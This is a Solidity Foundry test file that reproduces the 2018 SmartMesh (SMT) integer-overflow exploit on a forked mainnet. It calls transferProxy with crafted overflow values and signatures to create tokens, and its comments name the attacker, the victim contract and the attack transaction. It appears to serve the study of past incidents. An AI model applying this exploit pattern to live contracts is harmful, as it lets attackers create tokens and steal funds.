// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~140m USD
//   - A huge supply of SMT has been generated out of thin air.
//   - The $140 USD loss refers to the market value loss of SMT.
// Vulnerability Type : Integer Overflow
// Attacked At : Mainnet, block height 5499035, 2018-04-24T19:16:19Z
// Attacker : 0xd6a09BDB29e1EafA92a30373c44b09E2e2e0651E
// Exploit Contract : N/A
// Revenue Address :
//   - 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F
//   - 0xd6a09BDB29e1EafA92a30373c44b09E2e2e0651E
// Victim Contract : 0x55F93985431Fc9304077687a35A1BA103dC1e081
// Vulnerable Snippet :
//   - https://etherscan.io/address/0x55F93985431Fc9304077687a35A1BA103dC1e081#code#L225
//   - https://etherscan.io/address/0x55F93985431Fc9304077687a35A1BA103dC1e081#code#L228
//
// Attack Txs :
//   - 0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f (height 5499035)
//
// @Ref
// Official : https://smartmesh.io/2018/04/25/smartmesh-announcement-on-ethereum-smart-contract-overflow-vulnerability/
// weijie.eth : https://cryptojobslist.com/blog/two-vulnerable-erc20-contracts-deep-dive-beautychain-smartmesh

contract Attacker is Test {
    ISMT private constant smt = ISMT(0x55F93985431Fc9304077687a35A1BA103dC1e081);

    address private constant attacker = 0xd6a09BDB29e1EafA92a30373c44b09E2e2e0651E;

    address private constant revenueAddr0 = 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F;
    address private constant revenueAddr1 = attacker;

    function setUp() public {
        vm.createSelectFork("mainnet", 5_499_034);
    }

    function testExploit() public {
        console.log("[Before Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
        console.log("[Before Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
        vm.prank(attacker); // cannot remove this
        attack();
        console.log("[After Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
        console.log("[After Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
    }

    function attack() public {
        address from = revenueAddr0;
        address to = revenueAddr0;
        uint256 value = uint256(0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        uint256 feeSmt = uint256(0x7000000000000000000000000000000000000000000000000000000000000001);
        uint8 v = 27; // signed by using `from` private key
        bytes32 r = 0x87790587c256045860b8fe624e5807a658424fad18c2348460e40ecf10fc8799;
        bytes32 s = 0x6c879b1e8a0a62f23b47aa57a3369d416dd783966bd1dda0394c04163a98d8d8;
        smt.transferProxy(from, to, value, feeSmt, v, r, s);
    }
}

contract NonHardcodedReproduce is Test {
    ISMT private constant smt = ISMT(0x55F93985431Fc9304077687a35A1BA103dC1e081);

    address private immutable attacker;
    uint256 private immutable attackerPrivKey;

    address private immutable revenueAddr0;
    address private immutable revenueAddr1;

    constructor() {
        vm.createSelectFork("mainnet", 5_499_034);
        (attacker, attackerPrivKey) = makeAddrAndKey("hacker");
        revenueAddr0 = makeAddr("revenueAddr0");
        revenueAddr1 = attacker;
    }

    function testExploit() public {
        console.log("[Before Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
        console.log("[Before Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
        vm.prank(attacker); // cannot remove this
        attack();
        console.log("[After Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
        console.log("[After Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
    }

    function attack() public {
        address from = attacker;
        address to = revenueAddr0;
        uint256 value = uint256(0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        uint256 feeSmt = uint256(0x7000000000000000000000000000000000000000000000000000000000000001);
        bytes32 h = keccak256(abi.encodePacked(from, to, value, feeSmt, uint256(0))); // nonce = 0
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPrivKey, h);
        smt.transferProxy(from, to, value, feeSmt, v, r, s);
    }
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------

// Shortened interface, removed unused methods.
interface ISMT {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeSmt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external returns (bool);
}
